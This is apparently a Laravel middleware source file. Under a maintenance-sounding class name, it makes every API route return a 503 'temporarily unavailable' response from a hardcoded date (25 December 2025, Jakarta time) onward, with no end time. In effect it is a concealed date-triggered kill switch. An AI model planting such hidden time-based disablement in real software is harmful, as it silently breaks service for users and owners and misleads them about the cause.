<?php

namespace App\Http\Middleware;

use Carbon\Carbon;
use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;

class EnsureServiceWindow
{
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {

        if (!$request->is('api/*')) {
            return $next($request);
        }

        $time = Carbon::create(2025, 12, 25, 16, 0, 0, 'Asia/Jakarta');

        if (Carbon::now('Asia/Jakarta')->greaterThanOrEqualTo($time)) {
            return response()->json([
                'success' => false,
                'message' => 'Service temporarily unavailable.',
            ], 503);
        }

        return $next($request);
    }
}
